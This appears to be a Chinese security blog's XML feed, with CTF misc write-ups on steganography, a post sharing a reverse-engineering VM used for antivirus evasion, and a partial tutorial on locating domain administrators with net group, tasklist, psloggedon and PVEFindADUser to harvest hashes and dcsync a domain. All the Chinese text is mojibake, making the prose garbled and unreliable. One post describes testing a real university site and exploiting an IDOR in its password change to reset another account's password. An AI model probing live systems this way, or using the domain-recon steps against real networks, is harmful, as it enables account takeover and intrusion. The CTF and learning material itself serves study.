        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šğŸ˜”æ—©ä¸Šä¸ƒç‚¹å°±èµ·åºŠçˆ¬å»ç»ƒè½¦ç»ƒäº†ä¸€æ•´å¤©ï¼Œè®©åŒå­¦å…ˆå¸®å¿™ä¸‹äº†Miscçš„é™„ä»¶</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><blockquote><p>ç­¾åˆ°ï¼Œè¯·å…³æ³¨å…¬ä¼—å·ï¼Œå¹¶ä»¥è¯­éŸ³çš„æ–¹å¼ç”¨æ™®é€šè¯å–Šå‡ºâ€œå¼‚ä¸–ç›¸é‡ï¼Œå°½äº«ç¾å‘³ï¼Œå®‰æ’èµ›é«˜ã€‚â€ï¼Œå³å¯æ‹¿åˆ° flagã€‚æäº¤æ—¶è¯·æäº¤æ‹¬å·å†…çš„å†…å®¹ã€‚</p><p><a href="https://pan.baidu.com/s/15hqkNXUTPYxp5WdH0fqfAw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šdp67ï¼‰</p></blockquote><p>å›å¤å³å¯è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/@NLH_D%7B%5D_J_138@%7B5_%60EO$I.png"></p><h2 id="ç®€å•çš„pngéšå†™"><a href="#ç®€å•çš„pngéšå†™" class="headerlink" title="ç®€å•çš„pngéšå†™"></a>ç®€å•çš„pngéšå†™</h2><blockquote><p>ç®€å•çš„pngéšå†™</p><p><a href="https://pan.baidu.com/s/1wGwXy7Lnx4IDUNdlLc-XRg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šyf5qï¼‰</p></blockquote><p>ä¸éš¾çœ‹å‡ºæ˜¯ä¼ªåŠ å¯†å³09-&gt;00ï¼›å¾—åˆ°ä¸¤å¼ å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/flag.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hint.png"></p><p>010æ‰“å¼€hint.pngæ£€æµ‹å‘ç°ç¼ºå—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55464625153588.png"></p><p>è¡¥é½å¾—åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5154688979489.png"></p><p>æ ¹æ®æç¤ºoutguesså¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><blockquote><p>MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/H0@R3Z%7B$6%5BS3DR382HFT_PW.png"></p><p>æœ€ç»ˆè§£å¾—flagï¼šflag{0815e4c9f56148e78be60db56ce44d59}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)From_Hex(&#39;Auto&#39;)Gunzip()&amp;input&#x3D;TVVZNFFqQTRNRGc1TVRnd056ZzFSVEF3TURNMk5qWkROakUyTnpKRk56UTNPRGMwTURBMFFrTkNORGswUTBGR016WkNNRE13TXpRMFJETTFORGxDTmpSRE16TXpOVE16TXpSQ01UUTRNelZDTnpRNE5FRXpOVE16TkRnME9UTXlNelUwUWpSRk16VXpNVFE1TXpGQ05VRkRSVFZGTWpBeU1EQTBOamhDTWpJelJqSTRNREF3TURBdw</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/95578784815422.png"></p><p>å¾…ç»­â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çœŸé¦™ç³»åˆ—-ä¸ªäººé€†å‘è™šæ‹Ÿæœºåˆ†äº«</title>
      <link href="2021/03/26/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-%E4%B8%AA%E4%BA%BA%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/"/>
      <url>2021/03/26/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-%E4%B8%AA%E4%BA%BA%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="1-å‰è¨€"><a href="#1-å‰è¨€" class="headerlink" title="1.å‰è¨€"></a>1.å‰è¨€</h2><p>åœ¨æ­¤ä¹‹å‰æˆ‘åˆ†äº«è¿‡ä¸€ä¸ªpwnçš„è™šæ‹Ÿæœºï¼Œç²‰ä¸å›é¦ˆè¯´å¾ˆä¸é”™ï¼ï¼Œé‚£ä¹ˆä»Šå¤©æˆ‘å°±æŠŠæˆ‘å¹³æ—¶è¿›è¡Œé€†å‘åˆ†æå’Œå…æ€çš„è™šæ‹Ÿæœºåˆ†äº«å‡ºæ¥ï¼Œç»§ç»­å»¶ç»­çœŸé¦™ç³»åˆ—ã€‚</p><h2 id="2-æ•ˆæœæˆªå›¾"><a href="#2-æ•ˆæœæˆªå›¾" class="headerlink" title="2.æ•ˆæœæˆªå›¾"></a>2.æ•ˆæœæˆªå›¾</h2><p>å› ä¸ºå¹³æ—¶ä¹Ÿæ²¡å’‹åšé€†å‘åˆ†æï¼Œä¸€èˆ¬éƒ½åœ¨æ­¤è™šæ‹Ÿæœºä¸­ç¼–è¯‘å…æ€å·¥å…·ï¼Œè¿›è¡Œå…æ€æ¢ç´¢ï¼Œæ‰€ä»¥å·¥å…·ä¸æ˜¯å¾ˆé½å…¨ï¼Œä½†æ˜¯åº”è¯¥è¶³å¤Ÿäº†ã€‚</p><h3 id="2-1åæ±‡ç¼–è°ƒè¯•è½¯ä»¶"><a href="#2-1åæ±‡ç¼–è°ƒè¯•è½¯ä»¶" class="headerlink" title="2.1åæ±‡ç¼–è°ƒè¯•è½¯ä»¶"></a>2.1åæ±‡ç¼–è°ƒè¯•è½¯ä»¶</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%871.png"></p><p>æˆ‘è§‰å¾—ä¸é”™çš„åŸºæœ¬ä¸Šéƒ½æœ‰ã€‚</p><h3 id="2-2PEå·¥å…·"><a href="#2-2PEå·¥å…·" class="headerlink" title="2.2PEå·¥å…·"></a>2.2PEå·¥å…·</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%872.png"></p><p>å¹³æ—¶è‡ªå·±èƒ½ç”¨åˆ°çš„å°±è¿™ä¹ˆå¤šäº†</p><h3 id="2-3åŠ å£³å·¥å…·"><a href="#2-3åŠ å£³å·¥å…·" class="headerlink" title="2.3åŠ å£³å·¥å…·"></a>2.3åŠ å£³å·¥å…·</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%873.png"></p><h3 id="2-4è„±å£³å·¥å…·"><a href="#2-4è„±å£³å·¥å…·" class="headerlink" title="2.4è„±å£³å·¥å…·"></a>2.4è„±å£³å·¥å…·</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%874.png"></p><p>å¬è¯´é«˜æ‰‹è„±å£³è¿™æ–¹é¢å°±ç”¨odï¼Œidaæå®šã€‚</p><h3 id="2-5-å…¶ä»–å·¥å…·"><a href="#2-5-å…¶ä»–å·¥å…·" class="headerlink" title="2.5 å…¶ä»–å·¥å…·"></a>2.5 å…¶ä»–å·¥å…·</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%875.png"></p><h3 id="2-6æ¡Œé¢é¢„è§ˆ"><a href="#2-6æ¡Œé¢é¢„è§ˆ" class="headerlink" title="2.6æ¡Œé¢é¢„è§ˆ"></a>2.6æ¡Œé¢é¢„è§ˆ</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%876.png"></p><p>å¦‚æœè§‰å¾—å£çº¸ä¸é”™çš„ï¼Œé‚£è¯´æ˜å“ä½ç¡®å®ä¸é”™ï¼</p><h2 id="3-è¯´æ˜"><a href="#3-è¯´æ˜" class="headerlink" title="3.è¯´æ˜"></a>3.è¯´æ˜</h2><p>æœ€è¿‘å’Œlengyiå¸ˆå‚…ç­¹å»ºäº†ä¸€ä¸ªRedteamspace çŸ¥è¯†æ˜Ÿçƒï¼Œæ­¤æ˜Ÿçƒæ˜¯ä¸»è¦æ˜¯ä¸ºäº†æ¢è®¨å‰æ²¿çš„çº¢é˜ŸæŠ€æœ¯ï¼Œä»¥åŠä¸€äº›ä¸ä¸ºäººæ‰€çŸ¥çš„éªšå§¿åŠ¿ï¼Œè¥é€ ä¸€ä¸ªè‰¯å¥½çš„å­¦ä¹ æ°›å›´ï¼Œå¦‚æœä½ ä¸æˆ‘ä»¬ä¸€æ ·çƒ­çˆ±æŠ€æœ¯ï¼Œå–„äºåˆ†äº«ï¼Œé‚£ä¹ˆè¯·åŠ å…¥æˆ‘ä»¬å§ï¼</p><p>æ­¤é€†å‘è™šæ‹Ÿæœºä¹Ÿå°†æ”¾å…¥æ˜Ÿçƒä¸­ï¼Œå¼€æœºå¯†ç ä¹Ÿå°†åœ¨æ˜Ÿçƒä¸­å…¬å¸ƒï¼Œæœ€åçº¢é˜Ÿyydsã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/%E5%9B%BE%E7%89%877.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF æ¬¢ä¹ä¸ªäººèµ› 2021</title>
      <link href="2021/03/21/2021NepCTF/"/>
      <url>2021/03/21/2021NepCTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ğŸ‘´æ˜¯æ‡’ç‹—ï¼éƒ½å¾ˆå¿™æœ€è¿‘å°±æ²¡æ€ä¹ˆæ‰“</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="æˆ‘æ˜¯é—´è°2nd"><a href="#æˆ‘æ˜¯é—´è°2nd" class="headerlink" title="æˆ‘æ˜¯é—´è°2nd"></a>æˆ‘æ˜¯é—´è°2nd</h2><blockquote><p>åå¥³äººå¾€æˆ‘çš„uç›˜é‡Œå·å·æ”¾äº†ä¸€ä¸ªç¨‹åºï¼Œä½ èƒ½æ‰¾å‡ºå¥¹å¹²äº†ä»€ä¹ˆå—ï¼Ÿremember: try to forgery ip,but not to reverse it.</p><p><a href="https://pan.baidu.com/s/1v68XQW5PjXKaC9lWinChqQ">é™„ä»¶</a>ï¼ˆæå–ç ï¼š2qdtï¼‰</p></blockquote><p>ä¸ä¼šå•Š.jpg</p><h2 id="å‡ºé¢˜äººæ—¥è®°"><a href="#å‡ºé¢˜äººæ—¥è®°" class="headerlink" title="å‡ºé¢˜äººæ—¥è®°"></a>å‡ºé¢˜äººæ—¥è®°</h2><blockquote><p>æˆ‘æŠŠèŒ¶åŒ…çš„å‡ºé¢˜æ—¥è®°æ‰¾åˆ°äº†ï¼Œé‡Œé¢å±…ç„¶æœ‰ï¼ï¼ï¼</p><p><a href="https://pan.baidu.com/s/1SfmX_QMI3YKvp3NfcTl3aA">é™„ä»¶</a>ï¼ˆæå–ç ï¼š1eltï¼‰</p></blockquote><p>æ‰“å¼€æŸ¥é˜…å‘ç°ç¬¬åå…«å¤©å¤„æœ‰flagçš„è¸ªå½±</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/HH%5BP%7DY_14G%7BX5%7D13J0NOO28.png"></p><p>å°†å…¶excelä»¥å‹ç¼©åŒ…çš„æ–¹å¼æ‰“å¼€å‘ç°äº†ä¸ªhintå¹¶æ‰¾åˆ°fufufufufufufufufuufufufufufufufufufufufufufufufufu.flagï¼ˆpng</p><blockquote><p>hint:<br>éšå†™.wf pna fbyir guvf ceboyrz</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/PPZ[[7FCAZW$HU3DAFIS%U5.png"></p><p>æœ€åé€šè¿‡ä»¥ä¸‹é¡¹ç›®å¾—åˆ°flag</p><p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/flag.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NepCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡å¯¹æŸå¤§å­¦çš„é€»è¾‘æ¼æ´</title>
      <link href="2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<blockquote><p>éœ‡æƒŠï¼JOJOå¸ˆå‚…åˆæ—¥ç«™æƒ¹ï¼</p></blockquote><p>é—²æ¥æ— äº‹ï¼Œéšä¾¿åœ¨æŸfaé‡Œé¢æ‰¾æ‰¾ä¸€ä¸ªeduç«™ç‚¹ï¼Œçœ‹çœ‹è°æ˜¯ä»Šå¤©çš„å¹¸è¿å„¿å‘¢ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1499855574.png"></p><p>å¥½å®¶ä¼™å°±ä½ äº†ï¼Œè™½ç„¶ä¸å±äºæ•™è‚²ç½‘ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºä½ åº”è¯¥æ˜¯ï¼ˆQAQï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44321155564.png"></p><p>è¿›å…¥ç½‘é¡µï¼›Footer</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/12444356.png"></p><p>è¿˜æ•¢è¯´ä½ ä¸æ˜¯å¸¸å¨ï¼ˆå¤§å­¦ï¼‰ï¼Ÿå¼€å¹²ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5554884765.png"></p><p>äºŒè¯ä¸è¯´ï¼Œç›´æ¥æ³¨å†Œï¼Œå› ä¸ºæœ‰æ³¨å†Œï¼Œæµ‹è¯•çš„åŠŸèƒ½å°±æ¯”è¾ƒå¤š<br>æ³¨å†Œäº†ä¸€ä¸ªè´¦å·ï¼ˆtest/admin123ï¼‰,ç„¶åç™»é™†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/111654875455.png"></p><p>æ¬¸ï¼Œæ€ä¹ˆå›äº‹ï¼Œæˆ‘ä»¥ä¸ºç«™å·²ç»æ²¡äº†ï¼Œå‡†å¤‡æ”¾å¼ƒçš„æ—¶å€™ï¼Œæˆ‘è¿”å›ä¸€æ­¥ï¼Œç‚¹äº†ä¸ªé¦–é¡µ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/511222649.png"></p><p>è¿™ä»–å–µçš„ä¸æ˜¯ç™»ä¸Šäº†å—ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/618618774.png"></p><p>å¾ˆå¿«å•Šï¼Œçœ‹è§æœ‰ä¼ å¤´åƒçš„åœ°æ–¹ï¼Œä¸Šå»å°±æ˜¯burpsuiteï¼Œå¹²ä»–ä¸«çš„ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/61224566131.png"></p><p>çŸ¥é“ä½œè€…å¤´åƒä¸ºä»€ä¹ˆæ˜¯é”™è¯¯çš„å—ï¼Œæ˜¯å› ä¸ºæˆ‘æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å¤±è´¥äº†ã€‚çŸ¥é“æˆ‘ä¸ºä»€ä¹ˆç”µè¯ä¸æ‰“ç å—ï¼Œå› ä¸ºæ˜¯æˆ‘å‰å¥³å‹çš„ã€‚ï¼ˆå¼€ç©ç¬‘äº†ï¼Œä¹±è¾“çš„ï¼Œè¿™ä¹Ÿç®—ä¸ªä»»æ„ç”¨æˆ·æ³¨å†Œçš„æ´å§ï¼‰æˆ‘çœŸæ˜¯æ·¦äº†ã€‚å¤±è´¥è¿‡ç¨‹å°±ä¸æ”¾å‡ºæ¥äº†ï¼Œæˆ‘æ€•å¤§ä½¬ç¬‘æˆ‘ï¼555<br>æˆ‘èœï¼Œæˆ‘ä¸è¦webshelläº†ä¸è¡Œå—ï¼Œç„¶åedusrcå¯¹XSSå¾ˆä¸å‹å¥½ï¼Œ<br>Xssä¸è¦ç½¢äº†ï¼Œèœæˆ‘å°±æŒ–é€»è¾‘æ¼æ´ï¼<br>å°è¯•ä¿®æ”¹å¯†ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/145512436.png"></p><p>çœ‹æŠ“åŒ…èƒ½æŠ“åˆ°æˆ‘ä»¬æƒ³è¦çš„å‚æ•°å—<br>ä¸€ç›´æŠ“åŒ…forwardï¼Œç¬¬ä¸€ä¸ªåŒ…æ˜¯æ ¡éªŒtestçš„å¯†ç ï¼Œç›´åˆ°å‡ºç°ä¸‹å›¾ä¸ºæ­¢<br>çœ‹è§password=æˆ‘ä»¬è¦ä¿®æ”¹çš„å¯†ç  çš„æ—¶å€™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/444665757.png"></p><p>å˜¿ï¼Œå®ƒå‡ºæ¥äº†ï¼Œåº”è¯¥å¯ä»¥éå†userIdæ¥ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç ã€‚æ”¹æ”¹å°±å®Œäº‹ï¼ˆå·²çŸ¥å¦ä¸€ä¸ªæµ‹è¯•è´¦å·ä¸ºtest1/admin456, 107254ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/24245512424.png"></p><p>æ¿€åŠ¨çš„æ‰‹ç‚¹ç‚¹forward</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/75225744123.png"></p><p>è¿™ä¸å¾—èµ·é£å’¯~ç™»é™†test1çœ‹çœ‹<br>æŠ“åŒ…å¯ä»¥çœ‹è§å¯†ç æ˜¯ä¿®æ”¹åçš„admin1234</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4040123456.png"></p><p>æˆåŠŸç™»é™†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/14145201314250.png"></p><p>æˆ‘è¿™ç§èœé¸¡æ‰æŒ–é€»è¾‘æ¼æ´ã€‚å·²äº¤ç»™edusrcã€‚</p><p>å¿ƒç»†å¾—å¤©ä¸‹ï¼ï¼ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘åŸºç¡€-å®šä½åŸŸç®¡ç†å‘˜</title>
      <link href="2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
      <url>2021/03/18/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>â€‹    åœ¨åŸŸæ¸—é€ä¸­ï¼Œéœ€è¦å¯¹æœ‰ç›®çš„æ€§çš„æ¸—é€ï¼Œå¿«é€Ÿæ§åˆ¶ä¸€ä¸ªåŸŸæœ€å¿«çš„åŠæ³•ï¼ˆä¸åŒ…æ‹¬ç›´æ¥åˆ©ç”¨æå‡ä¸ºåŸŸç®¡çš„æ¼æ´ï¼‰å°±æ˜¯æ‹¿åˆ°åŸŸç®¡ç†å‘˜çš„hashï¼Œç„¶åå¯¹åŸŸæ§è¿›è¡Œdcsyncï¼Œæ‹¿åˆ°åŸŸå†…æ‰€æœ‰æˆå‘˜çš„hashï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å®šä½åŸŸç®¡ç†å‘˜åœ¨å“ªå°æœºå™¨ä¸Šç™»å½•è¿‡ï¼Ÿ</p><p>å½“ç„¶çªƒå–å‡­æ®åŸŸç®¡ç†å‘˜è¿›ç¨‹ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ï¼</p><p>1.é€šè¿‡net group â€œdomain adminsâ€ /domain åˆ—å‡ºåŸŸç®¡ç†å‘˜ç»„æˆå‘˜</p><p>2.é€šè¿‡tasklist /v åˆ—å‡ºæœ¬åœ°è¿›ç¨‹çš„æ‰€æœ‰è€…</p><p>3.è¿›è¡Œäº¤å‰å¤„ç†ï¼Œæ‰¾åˆ°åŸŸç®¡ç†è¿›ç¨‹</p><p>é€šè¿‡åŸŸæ­å»ºçš„åŸç†æ¥çœ‹ï¼Œåœ¨æœºå™¨åŠ å…¥åŸŸä¹‹åï¼ŒåŸŸç®¡ç†å‘˜ç»„æˆå‘˜ä¼šè‡ªåŠ¨åŠ å…¥åˆ°æœ¬åœ°çš„ç®¡ç†å‘˜ç»„ã€‚</p><p>å®šä½åŸŸç®¡ç†å‘˜çš„å¸¸è§„æ¸ é“ï¼š</p><p>1.æ—¥å¿—ï¼ˆæœ¬åœ°ç®¡ç†å‘˜æ—¥å¿—ï¼‰</p><p>2.ä¼šè¯ï¼ˆåŸŸå†…æ¯å°æœºå™¨çš„ç™»é™†å›è¯ï¼‰</p><h2 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a>å¸¸ç”¨å·¥å…·</h2><h3 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a>psloggedon.exe</h3><p>è¿™æ˜¯å¾®è½¯çš„è‡ªå¸¦çš„pstoolå·¥å…·åŒ…çš„ä¸€ä¸ªéå¸¸å®ç”¨çš„å·¥å…·ï¼Œå…¶åŸç†ä¸ºæ£€æŸ¥æ³¨å†Œè¡¨HKey_USERé¡¹çš„keyæ¥æŸ¥è¯¢ï¼Œä¼šè°ƒç”¨NetSession api,æ‰€ä»¥æœ‰äº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psloggedon è¦åˆ—å‡ºç™»é™†ä¿¡æ¯çš„æœºå™¨åæˆ–è€…ç”¨æˆ·å#å¦‚æœæ²¡æœ‰å¡« åˆ™é»˜è®¤ä¸ºæœ¬åœ°</span><br><span class="line">å¦‚æœæŒ‡å®šç”¨æˆ·åï¼Œåˆ™ä¼šæœç´¢æ¬¡ç”¨æˆ·ç™»é™†è¿‡å“ªäº›æœºå™¨</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">æè¿°</th><th></th></tr></thead><tbody><tr><td align="left">-</td><td>æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„åº¦é‡å•ä½</td></tr><tr><td align="left">-l</td><td>ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œè€Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½•</td></tr><tr><td align="left">-x</td><td>ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´</td></tr><tr><td align="left">\computername</td><td>æŒ‡å®šè¦ä¸ºå…¶åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºçš„åç§°</td></tr><tr><td align="left">username</td><td>æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘ç»œä¸­æœç´¢è¯¥ç”¨æˆ·ç™»é™†çš„è®¡ç®—æœº</td></tr></tbody></table><p>é…åˆnet localgroup administrators æ‰¾åˆ°åŸŸç®¡ç™»é™†è¿‡çš„æœºå™¨</p><h3 id="PVEFindaduser-exe"><a href="#PVEFindaduser-exe" class="headerlink" title="PVEFindaduser.exe"></a>PVEFindaduser.exe</h3><p>ç”¨äºæŸ¥æ‰¾ADç”¨æˆ·çš„ç™»å½•ä½ç½®ã€æšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»é™†çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ã€é€šè¿‡RDPç™»é™†çš„ç”¨æˆ·ã€ç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚</p><p>å‘½ä»¤ï¼›</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current#å°†è·å–åŸŸå†…æ‰€æœ‰è®¡ç®—æœºä¸Šå½“å‰ç™»é™†çš„æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">ç»“æœä¿å­˜åˆ°report.csvæ–‡ä»¶</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">-last</td><td align="left">å°†è·å–ç›®æ ‡è®¡ç®—æœºçš„æœ€åä¸€ä¸ªç™»é™†ç”¨æˆ·</td></tr><tr><td align="left">-target</td><td align="left">æŒ‡å®šè¦æŸ¥è¯¢çš„è®¡ç®—æœºã€‚</td></tr><tr><td align="left">-current [â€œusernameâ€]</td><td align="left">-currentå‚æ•°æ˜¾ç¤ºæ¯å°PCä¸Šå½“å‰ç™»å½•çš„ç”¨æˆ·åœ¨åŸŸä¸­ã€‚å¦‚æœæŒ‡å®šç”¨æˆ·åï¼ˆåœ¨å¼•å·ä¹‹é—´ï¼‰ï¼Œåˆ™ä»…å°†æ˜¾ç¤ºè¯¥ç‰¹å®šç”¨æˆ·ç™»å½•çš„PC</td></tr><tr><td align="left">-noping</td><td align="left">é˜»æ­¢å°è¯•æšä¸¾ç”¨æˆ·ç™»å½•åä¹‹å‰å¯¹ç›®æ ‡è®¡ç®—æœºæ‰§è¡Œpingå‘½ä»¤</td></tr><tr><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="netview-exe"><a href="#netview-exe" class="headerlink" title="netview.exe"></a>netview.exe</h3><p>netview.exeæ˜¯ä¸€ä¸ªæšä¸¾å·¥å…·ï¼Œä½¿ç”¨WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ï¼Œnetview.exeè¿˜å¯ä»¥æŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe 